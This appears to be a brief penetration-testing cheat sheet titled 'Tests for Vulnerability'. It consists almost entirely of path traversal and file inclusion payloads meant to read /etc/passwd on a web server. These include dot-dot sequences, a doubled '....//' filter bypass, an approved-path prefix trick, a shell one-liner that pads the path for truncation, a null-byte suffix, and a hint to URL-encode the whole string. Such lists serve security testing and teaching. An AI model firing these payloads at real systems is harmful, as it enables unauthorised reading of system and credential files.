Tests for Vulnerability
```php
/etc/passwd
```

```php
../../../etc/passwd
```

```php
/../../../etc/passwd
```

```php
....//....//....//....//etc/passwd
```

```php
./approvedPath/../../../../etc/passwd
```

```shell-session
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

```php
/etc/passwd%00
```

-- TRY URL ENCODING ENTIRE STRING
